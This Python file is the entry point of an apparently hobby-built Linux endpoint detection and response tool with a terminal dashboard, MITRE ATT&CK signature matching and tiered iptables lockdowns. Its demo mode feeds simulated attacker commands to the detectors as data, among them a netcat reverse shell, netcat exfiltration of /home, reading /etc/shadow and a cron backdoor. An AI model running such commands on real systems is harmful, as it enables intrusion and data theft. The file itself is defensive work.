"""
aegis.py — Aegis-LX v3.0
==========================
Adaptive Linux Endpoint Security Engine

Usage:
  sudo python3 aegis.py --monitor          Start monitoring
  sudo python3 aegis.py --demo             Demo mode (simulates attack phases)
  sudo python3 aegis.py --lockdown         Manually escalate to Tier 5
  sudo python3 aegis.py --release          Release manual lockdown
  sudo python3 aegis.py --status           Single snapshot

Pipeline:
  eBPF Observer → Translator → Stat Engine + Sig Engine
  → Tier Manager → Response Engine → Notifier → Logger
"""

import time
import argparse
import signal
import sys
import os
from datetime import datetime

from observer.system_observer import collect_process_info
from translator.signal_translator import translate_process_to_signals
from detection.stat_engine import StatEngine
from detection.signature_engine import SignatureEngine
from response.tier_manager import TierManager, TIER_NAMES, TIER_COLORS
from response.response_engine import apply_tier, flush_all_rules
from alert.notifier import alert_tier_change, alert_lockdown_prompt, notify
from logger.logger import AegisLogger

# ── Colours ───────────────────────────────────────────────────────────────────
R  = "\033[0m"
B  = "\033[1m"
DIM= "\033[2m"
G  = "\033[92m"
Y  = "\033[93m"
RE = "\033[91m"
C  = "\033[96m"
M  = "\033[95m"
W  = "\033[97m"

TIER_C = {0:G, 1:C, 2:Y, 3:Y, 4:RE, 5:M}

# ── SOC Banner ────────────────────────────────────────────────────────────────
BANNER = f"""
{C}{B}
  ╔══════════════════════════════════════════════════════════════╗
  ║   █████╗ ███████╗ ██████╗ ██╗███████╗       ██╗     ██╗  ██╗║
  ║  ██╔══██╗██╔════╝██╔════╝ ██║██╔════╝       ██║     ╚██╗██╔╝║
  ║  ███████║█████╗  ██║  ███╗██║███████╗ █████╗██║      ╚███╔╝ ║
  ║  ██╔══██║██╔══╝  ██║   ██║██║╚════██║╚════╝██║      ██╔██╗  ║
  ║  ██║  ██║███████╗╚██████╔╝██║███████║       ███████╗██╔╝ ██╗ ║
  ║  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚══════╝       ╚══════╝╚═╝  ╚═╝║
  ║          Adaptive Linux Endpoint Security Engine  v3.0       ║
  ║          Statistical Anomaly + MITRE Kill Chain Detection    ║
  ╚══════════════════════════════════════════════════════════════╝
{R}"""

# ── SOC dashboard header (printed once per cycle) ────────────────────────────
def print_header(cycle, tier_manager, warming_up):
    tier  = tier_manager.current
    tname = TIER_NAMES[tier]
    tc    = TIER_C[tier]
    ts    = datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
    warm  = f"  {C}⏳ WARM-UP{R}" if warming_up else ""

    print(f"\n{DIM}{'═'*70}{R}")
    print(f"  {B}AEGIS-LX SOC{R}  │  {DIM}Cycle {cycle:05d}{R}  │  {ts}{warm}")
    print(f"  Active Response: {tc}{B}TIER {tier} — {tname}{R}")
    print(f"{DIM}{'═'*70}{R}")


# ── Stat engine panel ────────────────────────────────────────────────────────
def print_stat_panel(report):
    level = report.get("risk_level", "LOW")
    lc    = {  "LOW":G, "MEDIUM":Y, "HIGH":RE}.get(level, W)
    print(f"\n  {C}┌─ BEHAVIOURAL ENGINE (Z-Score){R}  risk={lc}{B}{level}{R}  "
          f"events={report['total_events']}  unique={report['unique_procs']}")
    anomalies = report.get("anomalies", [])
    if not anomalies:
        print(f"  {C}│{R}  {G}✓ All behavioural metrics within normal range{R}")
    for a in anomalies:
        sc = RE if a["severity"] in ("CRITICAL","HIGH") else Y
        print(f"  {C}│{R}  {sc}⚠ [{a['layer']}]{R} {a['detail']}")
    print(f"  {C}└{'─'*50}{R}")


# ── Signature engine panel ───────────────────────────────────────────────────
def print_sig_panel(sig_result):
    score = sig_result["score"]
    level = sig_result["risk_level"]
    lc    = {"LOW":G, "MEDIUM":Y, "HIGH":RE}.get(level, W)
    hits  = sig_result["hits"]
    print(f"\n  {M}┌─ SIGNATURE ENGINE (MITRE ATT&CK){R}  risk={lc}{B}{level}{R}  score={score}")
    if not hits:
        print(f"  {M}│{R}  {G}✓ No known attack signatures detected{R}")
    for h in hits[:4]:
        cmd = h.get("full_cmd","")[:55]
        print(f"  {M}│{R}  {RE}⚠ [{h['phase']}]{R} {cmd}")
        print(f"  {M}│{R}    {DIM}→ {h['mitre'][:65]}{R}")
    print(f"  {M}└{'─'*50}{R}")


# ── Kill chain phase tracker panel ──────────────────────────────────────────
PHASE_ORDER = ["RECON","DISCOVERY","CREDENTIAL","EXECUTION","PERSISTENCE","EXFILTRATION","LATERAL"]

def print_killchain_panel(sig_result, tier_manager):
    active = set(sig_result.get("phases", []))
    print(f"\n  {Y}┌─ KILL CHAIN TRACKER{R}")
    row = "  │  "
    for ph in PHASE_ORDER:
        if ph in active:
            row += f"{RE}{B}[{ph[:5]}]{R} "
        else:
            row += f"{DIM}[{ph[:5]}]{R} "
    print(f"  {Y}│{R}{row}")
    history_phases = set(tier_manager.threat_history)
    if history_phases - {"SAFE"}:
        hp = ", ".join(sorted(history_phases - {"SAFE"}))
        print(f"  {Y}│{R}  {DIM}Recent history: {hp}{R}")
    print(f"  {Y}└{'─'*50}{R}")


# ── Tier status panel ────────────────────────────────────────────────────────
TIER_DESC = {
    0: "Observing — no active defences",
    1: "Alert sent — monitoring intensified",
    2: "Suspect process CPU-throttled (PID-targeted)",
    3: "Suspect process network-contained (PID-targeted)",
    4: "All NEW outbound blocked — established sessions safe",
    5: "FULL LOCKDOWN — awaiting manual operator release",
}
TIER_BADGES = {
    0: f"{G}●{R}",
    1: f"{C}●{R}",
    2: f"{Y}●{R}",
    3: f"{Y}●{R}",
    4: f"{RE}●{R}",
    5: f"{M}●{R}",
}

def print_tier_panel(tier_manager, change):
    tier  = tier_manager.current
    tc    = TIER_C[tier]
    badge = TIER_BADGES[tier]
    print(f"\n  {W}┌─ RESPONSE TIER{R}")
    print(f"  {W}│{R}  {badge} {tc}{B}TIER {tier}: {TIER_NAMES[tier]}{R}")
    print(f"  {W}│{R}  {DIM}{TIER_DESC[tier]}{R}")
    if change["changed"]:
        arrow = "⬆" if change["direction"] == "UP" else "⬇"
        cc    = RE if change["direction"] == "UP" else G
        print(f"  {W}│{R}  {cc}{B}{arrow} {change['old_name']} → {change['new_name']}{R}  {DIM}{change['reason'][:60]}{R}")
    if tier == 5:
        print(f"  {W}│{R}  {M}{B}⚠ Run: sudo python3 aegis.py --release  to step down{R}")
    print(f"  {W}└{'─'*50}{R}")


# ── DEMO MODE ────────────────────────────────────────────────────────────────
DEMO_SCRIPT = [
    # (phase_label, display_msg, fake_signals)
    ("IDLE",        "System is quiet. Aegis warming up...", []),
    ("IDLE",        "Normal activity observed.", []),
    ("RECON",       "Attacker starts network scan (nmap)", [
        {"signal_type":"nmap","phase":"RECON","severity":15,"raw_weight":15,
         "mitre":"T1046 (Network Service Discovery)",
         "context":{"full_cmd":"nmap -sV 192.168.1.0/24","pid":9001,"user":"attacker","timestamp":"now"}}
    ]),
    ("DISCOVERY",   "Attacker runs LinPEAS for privilege info", [
        {"signal_type":"linpeas","phase":"DISCOVERY","severity":28,"raw_weight":28,
         "mitre":"T1082 (System Information Discovery)",
         "context":{"full_cmd":"./linpeas.sh","pid":9002,"user":"attacker","timestamp":"now"}}
    ]),
    ("CREDENTIAL",  "Attacker tries to read /etc/shadow", [
        {"signal_type":"cat","phase":"CREDENTIAL","severity":25,"raw_weight":25,
         "mitre":"T1003.008 (/etc/shadow Access)",
         "context":{"full_cmd":"cat /etc/shadow","pid":9003,"user":"attacker","timestamp":"now"}}
    ]),
    ("EXECUTION",   "Attacker opens reverse shell (nc)", [
        {"signal_type":"nc","phase":"EXECUTION","severity":22,"raw_weight":22,
         "mitre":"T1095 (Non-Application Layer Protocol)",
         "context":{"full_cmd":"nc -e /bin/bash 10.0.0.5 4444","pid":9004,"user":"attacker","timestamp":"now"}}
    ]),
    ("PERSISTENCE", "Attacker adds cron backdoor", [
        {"signal_type":"crontab","phase":"PERSISTENCE","severity":18,"raw_weight":18,
         "mitre":"T1053.003 (Cron Persistence)",
         "context":{"full_cmd":"crontab -e /etc/cron.d/backdoor","pid":9005,"user":"attacker","timestamp":"now"}}
    ]),
    ("EXFILTRATION","Attacker pipes data out via netcat", [
        {"signal_type":"nc","phase":"EXFILTRATION","severity":30,"raw_weight":30,
         "mitre":"T1048 (Exfil via Netcat)",
         "context":{"full_cmd":"tar czf - /home | nc 10.0.0.5 9999","pid":9006,"user":"attacker","timestamp":"now"}}
    ]),
    ("COOLDOWN",    "Threat cleared. System de-escalating...", []),
    ("COOLDOWN",    "Continuing cool-down...", []),
    ("NORMAL",      "System returned to normal posture.", []),
]

def run_demo(logger):
    print(BANNER)
    print(f"  {Y}{B}⚡ DEMO MODE — Simulating MITRE ATT&CK Kill Chain{R}")
    print(f"  {DIM}No real attack tools are running. This is a safe simulation.{R}\n")
    time.sleep(2)

    stat_engine = StatEngine()
    sig_engine  = SignatureEngine()
    tier_manager= TierManager()
    cycle       = 0

    for phase_label, description, fake_signals in DEMO_SCRIPT:
        cycle += 1
        time.sleep(3)   # 3 seconds between demo steps for presentation pacing

        print(f"\n{M}{B}  ▶ DEMO STEP {cycle}: [{phase_label}] {description}{R}")
        logger.log_demo_event(phase_label, description)

        # Use real signals for stat + sig engines
        # For demo, we push fake signals directly
        stat_report = stat_engine.observe(fake_signals)
        sig_result  = sig_engine.analyze(fake_signals)

        change = tier_manager.evaluate(stat_report, sig_result)

        if change["changed"]:
            apply_tier(change["new_tier"], change["old_tier"], sig_result["hits"])
            alert_tier_change(change["old_tier"], change["new_tier"],
                              change["reason"], sig_result["hits"])
            logger.log_tier_change(change)

        print_header(cycle, tier_manager, stat_report.get("warming_up", False))
        print_stat_panel(stat_report)
        print_sig_panel(sig_result)
        print_killchain_panel(sig_result, tier_manager)
        print_tier_panel(tier_manager, change)

    print(f"\n  {G}{B}✓ Demo complete. All tiers demonstrated.{R}")
    print(f"  {DIM}Run --monitor to start real monitoring.{R}\n")


# ── MAIN MONITOR LOOP ─────────────────────────────────────────────────────────
def run_monitor(logger):
    print(BANNER)
    print(f"  {G}Starting Aegis-LX monitoring...{R}")
    print(f"  {DIM}Behavioural engine warm-up: ~2 minutes{R}")
    print(f"  {DIM}Signature engine: ACTIVE immediately{R}")
    print(f"  {DIM}Press Ctrl+C to stop  │  sudo python3 aegis.py --lockdown for manual Tier 5{R}\n")

    stat_engine  = StatEngine()
    sig_engine   = SignatureEngine()
    tier_manager = TierManager()
    cycle        = 0

    # Graceful shutdown
    def on_exit(sig, frame):
        print(f"\n\n  {Y}Shutting down Aegis-LX — flushing all iptables rules...{R}")
        flush_all_rules()
        print(f"  {G}Clean exit.{R}\n")
        sys.exit(0)
    signal.signal(signal.SIGINT, on_exit)
    signal.signal(signal.SIGTERM, on_exit)

    while True:
        cycle += 1

        # 1. Observe
        raw = collect_process_info()

        # 2. Translate
        signals = []
        for proc in raw:
            translated = translate_process_to_signals(proc)
            signals.extend(translated)
            for s in translated:
                logger.log_signal(s)

        # 3. Detect
        stat_report = stat_engine.observe(signals)
        sig_result  = sig_engine.analyze(signals)

        # 4. Decide tier
        change = tier_manager.evaluate(stat_report, sig_result)

        # 5. Respond — only when tier changes
        if change["changed"]:
            apply_tier(change["new_tier"], change["old_tier"], sig_result["hits"])
            alert_tier_change(change["old_tier"], change["new_tier"],
                              change["reason"], sig_result["hits"])
            logger.log_tier_change(change)

            # If we've been at Tier 4 and things keep being suspicious,
            # prompt the operator to consider manual lockdown
            if change["new_tier"] == 4 and change["direction"] == "UP":
                alert_lockdown_prompt()

        # 6. Log
        logger.log_risk({
            "tier":       tier_manager.current,
            "stat_level": stat_report.get("risk_level"),
            "sig_score":  sig_result["score"],
            "phases":     sig_result["phases"],
        })

        # 7. Display SOC dashboard
        print_header(cycle, tier_manager, stat_report.get("warming_up", False))
        print_stat_panel(stat_report)
        print_sig_panel(sig_result)
        print_killchain_panel(sig_result, tier_manager)
        print_tier_panel(tier_manager, change)

        time.sleep(10)


# ── MANUAL LOCKDOWN ───────────────────────────────────────────────────────────
def run_lockdown(logger):
    """Called from a second terminal by the operator."""
    from response.response_engine import _escalate
    print(f"\n  {M}{B}⚠ MANUAL LOCKDOWN REQUESTED{R}")
    confirm = input(f"  {Y}Type CONFIRM to proceed with Tier 5 Lockdown: {R}").strip()
    if confirm != "CONFIRM":
        print(f"  {G}Lockdown cancelled.{R}")
        return
    # Write a lockdown flag file that the monitor loop will pick up
    with open(".aegis_lockdown", "w") as f:
        f.write("MANUAL")
    print(f"  {M}{B}Tier 5 LOCKDOWN activated. Monitor loop will enforce.{R}")
    print(f"  {DIM}To release: sudo python3 aegis.py --release{R}\n")
    notify(5, "Aegis-LX LOCKDOWN", "Manual Tier 5 Lockdown activated by operator")
    _escalate(5, [])


def run_release():
    if os.path.exists(".aegis_lockdown"):
        os.remove(".aegis_lockdown")
        print(f"\n  {G}{B}✓ Lockdown flag removed. Monitor will step down to Tier 4.{R}\n")
        notify(1, "Aegis-LX Released", "Manual lockdown released by operator")
    else:
        print(f"  {Y}No manual lockdown active.{R}")


# ── ENTRY POINT ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Aegis-LX: Adaptive Linux Endpoint Security Engine"
    )
    parser.add_argument("--monitor",  action="store_true", help="Start monitoring")
    parser.add_argument("--demo",     action="store_true", help="Run demo simulation")
    parser.add_argument("--lockdown", action="store_true", help="Manual Tier 5 lockdown")
    parser.add_argument("--release",  action="store_true", help="Release manual lockdown")
    parser.add_argument("--status",   action="store_true", help="Single snapshot")
    args = parser.parse_args()

    logger = AegisLogger()

    if args.monitor:
        run_monitor(logger)
    elif args.demo:
        run_demo(logger)
    elif args.lockdown:
        run_lockdown(logger)
    elif args.release:
        run_release()
    elif args.status:
        # Quick single-cycle check
        raw     = collect_process_info()
        signals = []
        for proc in raw:
            signals.extend(translate_process_to_signals(proc))
        se   = StatEngine()
        sige = SignatureEngine()
        tm   = TierManager()
        sr   = se.observe(signals)
        sigr = sige.analyze(signals)
        chg  = tm.evaluate(sr, sigr)
        print(BANNER)
        print_header(1, tm, sr.get("warming_up", False))
        print_stat_panel(sr)
        print_sig_panel(sigr)
        print_killchain_panel(sigr, tm)
        print_tier_panel(tm, chg)
    else:
        print(f"\n  {B}Aegis-LX v3.0{R}")
        print("  Usage:")
        print("    sudo python3 aegis.py --monitor    Start monitoring")
        print("    sudo python3 aegis.py --demo       Demo mode (presentation)")
        print("    sudo python3 aegis.py --lockdown   Manual Tier 5")
        print("    sudo python3 aegis.py --release    Release lockdown")
        print("    sudo python3 aegis.py --status     Single snapshot\n")
